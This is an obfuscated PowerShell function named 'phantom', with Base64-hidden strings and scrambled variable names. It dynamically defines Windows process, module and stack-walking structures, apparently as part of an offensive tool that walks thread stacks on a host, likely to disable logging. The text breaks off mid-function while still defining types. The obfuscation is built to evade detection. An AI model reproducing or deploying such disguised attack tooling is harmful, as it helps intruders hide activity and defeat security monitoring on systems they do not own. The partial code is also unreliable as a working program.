function phantom {
[CmdLetBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $true)]
        [String[]]$ComputerName,
        [Parameter(ParameterSetName = 'Id')]
        [ValidateNotNullOrEmpty()]
        [Int]$Id = -1
    )
    ${/=\/\/==\/\___/=\} = {
        Param (
            [Parameter()]
            [String]$Name,
            [Parameter()]
            [Int]$Id
        )
        if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAHMAYwByAGkAcAB0ACAAcwBoAG8AdQBsAGQAIABiAGUAIAByAGEAbgAgAHcAaQB0AGgAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAaQB2AGUAIABwAHIAaQB2AGkAbABpAGcAZQBzAC4A')))
        }
        ${__/\___/=\_/\_/=\} = [AppDomain]::CurrentDomain
        ${/=\/=\/==\/======} = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFcAYQBsAGsAZQByAA=='))))
        ${/===\_/\/\/\__/==} = ${__/\___/=\_/\_/=\}.DefineDynamicAssembly(${/=\/=\/==\/======}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${_/\/\/=\/\/\___/=} = ${/===\_/\/\/\__/==}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
        ${___/\_/\/\/=\_/=\} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBvAHIAQQByAGMAaAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEkATgBUAEUATAA='))), [UInt16] 0)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAE0ASQBQAFMA'))), [UInt16] 0x01)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEEATABQAEgAQQA='))), [UInt16] 0x02)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAFAAUABDAA=='))), [UInt16] 0x03)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAFMASABYAA=='))), [UInt16] 0x04)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEEAUgBNAA=='))), [UInt16] 0x05)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEkAQQA2ADQA'))), [UInt16] 0x06)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEEATABQAEgAQQA2ADQA'))), [UInt16] 0x07)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEEATQBEADYANAA='))), [UInt16] 0x09)
        [void]${__/\_/\___/\_____}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAFUATgBLAE4ATwBXAE4A'))), [UInt16] 0xFFFF)
        ${Global:/=\/\/\_/==\____/} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0AXwBJAE4ARgBPAA=='))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBvAHIAQQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/=\/\/\_/==\____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), [Int16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGcAZQBTAGkAegBlAA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQBBAHAAcABsAGkAYwBhAHQAaQBvAG4AQQBkAGQAcgBlAHMAcwA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAHAAcABsAGkAYwBhAHQAaQBvAG4AQQBkAGQAcgBlAHMAcwA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUAByAG8AYwBlAHMAcwBvAHIATQBhAHMAawA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFAAcgBvAGMAZQBzAHMAbwByAHMA'))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBvAHIAVAB5AHAAZQA='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG8AbgBHAHIAYQBuAHUAbABhAHIAaQB0AHkA'))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBvAHIATABlAHYAZQBsAA=='))), [Int16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBvAHIAUgBlAHYAaQBzAGkAbwBuAA=='))), [Int16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${Global:/===\__/=\_/\/\__} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBPAEQAVQBMAEUAXwBJAE4ARgBPAA=='))), ${_/==\/=\/\__/=\_/}, [ValueType], 12)
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAEIAYQBzAGUATwBmAEQAbABsAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${Global:/===\/\_/==\/\_/=} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBEAEgARQBMAFAA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAHIAZQBhAGQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAEMAYQBsAGwAYgBhAGMAawBTAHQAYQBjAGsA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAEMAYQBsAGwAYgBhAGMAawBCAFMAdABvAHIAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAGEAbABsAGIAYQBjAGsA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAbQBlAFAAbwBpAG4AdABlAHIA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAEMAYQBsAGwAVQBzAGUAcgBNAG8AZABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAFUAcwBlAHIAQwBhAGwAbABiAGEAYwBrAEQAaQBzAHAAYQB0AGMAaABlAHIA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AUgBhAG4AZwBlAFMAdABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAFUAcwBlAHIARQB4AGMAZQBwAHQAaQBvAG4ARABpAHMAcABhAHQAYwBoAGUAcgA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAYwBrAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAYwBrAEwAaQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${/===\_/\/\_/\_/\/} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), [UInt64[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/==\_/=\/=\_/\__} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
        ${__/\__/==\_/==\_/} = [Runtime.InteropServices.UnmanagedType]::ByValArray
        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 5))
        [void]${/===\_/\/\_/\_/\/}.SetCustomAttribute(${_/==\/\___/\____/})
        ${_________/==\_/=\} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQAUgBFAFMAUwA2ADQA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGcAbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${Global:____/==\/====\_/\} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEAQwBLAEYAUgBBAE0ARQA2ADQA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBQAEMA'))), ${____/==\/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBSAGUAdAB1AHIAbgA='))), ${____/==\/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBGAHIAYQBtAGUA'))), ${____/==\/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBTAHQAYQBjAGsA'))), ${____/==\/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBCAFMAdABvAHIAZQA='))), ${____/==\/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwBUAGEAYgBsAGUARQBuAHQAcgB5AA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${/=====\_/=\/=\__/} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAHMA'))), [UInt64[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 4))
        [void]${/=====\_/=\/=\__/}.SetCustomAttribute(${_/==\/\___/\____/})
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAHIA'))), [Bool], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbAA='))), [Bool], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${/===\_/\/\_/\_/\/} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), [UInt64[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 3))
        [void]${/===\_/\/\_/\_/\/}.SetCustomAttribute(${_/==\/\___/\____/})
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBkAEgAZQBsAHAA'))), ${_________/==\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${Global:_/=\/\/=\__/\/=\/} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAEgATABQAF8AUwBZAE0AQgBPAEwAVwA2ADQA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AHIAdQBjAHQA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATgBhAG0AZQBMAGUAbgBnAHQAaAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${/=\/==\/\/\_/\_/=} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/==\/\___/\____/} = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList (${___/\_/\/\/=\_/=\}, ${__/\__/==\_/==\_/}, ${_/==\_/=\/=\_/\__}, @([Int32] 33))
        [void]${/=\/==\/\/\_/\_/=}.SetCustomAttribute(${_/==\/\___/\____/})
        ${Global:_/\_/\/=\__/\/\__} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBMAE8AQQBUADEAMgA4AA=='))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [Int64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [Int64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/=\_/\__/\/\___/} = ${__/\_/\___/\_____}.CreateType()
        ${_/==\/=\/\__/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBMAE8AQQBUAEkATgBHAF8AUwBBAFYARQBfAEEAUgBFAEEA'))), ${_/==\/=\/\__/=\_/}, [ValueType])
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdAByAG8AbABXAG8AcgBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAVwBvAHIAZAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcAVwBvAHIAZAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAE8AZgBmAHMAZQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAFMAZQBsAGUAYwB0AG8AcgA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        [void]${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAGUAbABlAGMAdABvAHIA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${__/\__/\/===\__/\} = ${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAZQByAEEAcgBlAGEA'))), [Byte[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
